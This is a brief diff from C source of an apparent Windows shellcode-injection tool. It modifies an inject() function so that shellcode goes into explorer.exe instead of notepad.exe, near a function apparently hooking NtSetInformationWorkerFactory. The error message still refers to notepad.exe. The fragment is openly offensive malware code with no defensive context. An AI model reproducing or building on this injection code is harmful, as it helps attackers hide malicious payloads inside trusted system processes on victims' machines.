@@ -42,7 +42,7 @@ NTSTATUS MyNtSetInformationWorkerFactory(
 }
 BOOL inject(unsigned char* g_shellcode,SIZE_T shellcodeSize)
 {
-	DWORD pid = getPIDByName(L"notepad.exe");
+	DWORD pid = getPIDByName(L"explorer.exe");
 	if(pid == 0)
 	{
 		printf("未找到notepad.exe进程\n");
